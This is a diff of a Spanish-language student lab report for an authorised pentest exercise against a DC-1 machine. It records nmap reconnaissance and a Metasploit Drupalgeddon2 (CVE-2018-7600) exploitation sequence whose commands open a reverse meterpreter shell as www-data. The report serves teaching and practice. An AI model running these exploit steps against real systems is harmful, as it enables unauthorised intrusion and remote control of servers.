@@ -34,14 +34,14 @@ qué riesgo supone y qué tiene que hacer el cliente.*
 
 | Campo | Valor |
 |---|---|
-| Equipo | [ 3 ] |
-| Operador / Investigador / Documentalista/ Revisor | [ Alejandro ] / [ Angela ] / [ Rubén ] / [ Hugo ] |
-| Fecha | [ 19-11-2026 ] |
-| IP de Kali | [10.0.1.10__] |
-| IP de DC-1 (objetivo) | [10.0.1.12__] |
+| Equipo | 3 |
+| Operador / Investigador / Documentalista/ Revisor | Alejandro / Angela / Rubén / Hugo |
+| Fecha | 19-11-2026 |
+| IP de Kali | 10.0.1.10 ] |
+| IP de DC-1 (objetivo) | 10.0.1.12 |
 | Permitido | Solo la IP de DC-1: escaneo, análisis web, explotación y escalada |
 | Prohibido | Cualquier otra IP, la red del centro, la denegación de servicio |
-| ¿La IP de DC-1 está en `10.0.1.0/24`? | [**Sí** / No] |
+| ¿La IP de DC-1 está en `10.0.1.0/24`? | Sí |
 
 ---
 
@@ -57,12 +57,19 @@ que va a pasar. Si no sabéis escribirlo, preguntad a la IA qué hace el comando
 
 | Comando | Qué esperamos | Qué ha salido (lo importante) | Captura |
 |---|---|---|---|
-| [ `nmap -sn 10.0.1.0/24` ] | [ Esperemos que escanee la red 10.0.1.0/24 y nos diga todas las IPs conectadas ] | [ Sale la IP de la maquina vulnerable 10.0.1.12 ] | [n.º1] |
-| [ `nmap -sV -sC 10.0.1.12` ] | [ Esperamos que nos escanee los puertos abiertos, los servicios y las versiones de la IP ademas de las cabeceras ] | [ El puerto 22 ssh, el 80 con http con cabecera drupal7 y 111 con RCPbind ] | [n.º2] |
+| `ip a` | Descubrimos la IP de nuestro equipo para así poder buscar la de la máquina vulnerable | IP de nuestro equipo (10.0.1.10) | nº 1 |
+| `nmap -sn 10.0.1.0/24` | Esperemos que escanee la red 10.0.1.0/24 y nos diga todas las IPs conectadas ] | Sale la IP de la maquina vulnerable 10.0.1.12 | nº 2 |
+| `nmap -sV -sC 10.0.1.12` | Esperamos que nos escanee los puertos abiertos, los servicios y sus versiones en la IP (-sV); además de ejecutar scripts de reconocimiento de vulnerabilidades (-sC) | El puerto 22 con ssh, el 80 con http (con generador drupal7) y el 111 con RCPbind | nº 3 |
 
-**Servicios encontrados:** [22 · ssh · Openssh 6.0p1 Debian 4+DEB7u7] [80 · shttp · Apachehttpd 2.2.22 (Debian)] [111 · RCPbind · 2-4]
+**Servicios encontrados:**  
+| Puerto | Servicio | Versión |
+| --- | --- | --- |
+| 22 | ssh | Openssh 6.0p1 Debian 4+DEB7u7 |  
+| 80 | http | Apachehttpd 2.2.22 (Debian) |  
+| 111 | RCPbind | 2-4 |
 
-**¿Qué servicio parece más interesante y por qué?** [ El servicio http es el mas importante debido a que esta abierto a internet y en un principio no tiene clave ]
+**¿Qué servicio parece más interesante y por qué?**  
+El servicio http es el más importante debido a que está abierto a internet y en un principio no tiene clave de acceso.
 
 ### Fase 2 · Vulnerabilidades: ¿qué tiene un fallo conocido?
 
@@ -71,9 +78,10 @@ que va a pasar. Si no sabéis escribirlo, preguntad a la IA qué hace el comando
 
 | Comando o fuente consultada | Qué esperamos | Qué ha salido | Captura |
 |---|---|---|---|
-| [ msfconsole && search drupal7 ] | [ Esperamos obtener una vulnerabilidad de la cabecera drupal7 ] | [ Ha salido una vulnerabilidad conocida como drupalggedon una vulnerabilidad critica que permite la ejecución remota de código] | [n.º3] |
+| [ msfconsole && search drupal7 ] | Esperamos obtener una vulnerabilidad relacionada con drupal7 en la consola de Metasploit | Ha salido una vulnerabilidad conocida como drupalggedon2, una vulnerabilidad crítica que permite la ejecución remota de código | nº 4 |
 
-**Vulnerabilidad elegida (CVE) y qué permite hacer:** [ CVE-2014-3704 permite la ejecución remota de código ]
+**Vulnerabilidad elegida (CVE) y qué permite hacer:**  
+CVE-2018-7600, permite la ejecución remota de código.
 
 ### Fase 3 · Explotación: ¿cómo conseguimos entrar?
 
@@ -82,10 +90,18 @@ que va a pasar. Si no sabéis escribirlo, preguntad a la IA qué hace el comando
 
 | Comando | Qué esperamos | Qué ha salido | Captura |
 |---|---|---|---|
-| [  ] | [  ] | [  ] | [n.º4] |
+| use exploit/unix/webapp/drupal_drupalggedon2 target Drupal 7.x | Seleccionamos el exploit necesario para explotar la vulnerabilidad | Accedemos al exploit con meterpreter | nº 4 |
+| set LHOST 10.0.1.10 | Ponemos como host emisor (local) nuestra IP | Vemos que el host se ha configurado correctamente | nº 4 |
+| set LPORT 4789 | Ponemos como puerto del emisor el 4789 (cualquier puerto sin usar sirve) | Vemos que el puerto se ha configurado correctamente | nº 4 |
+| set RPORT 80 | Ponemos como puerto del receptor el 80 (puerto con HTTP abierto) | Vemos que el puerto se ha configurado correctamente | nº 4 |
+| set RHOST 10.0.1.12 | Ponemos como host receptor (remoto) la IP de la máquina vulnerable | Vemos que el host se ha configurado correctamente | nº 4 |
+| exploit | Ejecutamos el exploit cargado anteriormente, esperando establecer conexión con posibilidad de ejecutar código remotamente | Vemos como se ejecuta un manejador TCP reverso e inicia una sesión de meterpreter | nº 4 |
 
-**¿Con qué usuario hemos entrado?** [ www-data ]
-**¿Por qué no somos administradores todavía?** [ Por que deberemos de escalar de privilegios a traves de los comando que diremos en Posexplotación. ]
+**¿Con qué usuario hemos entrado?**  
+www-data  
+
+**¿Por qué no somos administradores todavía?**  
+Porque entramos con un usuario web normal sin permisos; deberemos escalar privilegios.
 
 ### Fase 4 · Posexplotación: ¿cómo llegamos a administrador?
 
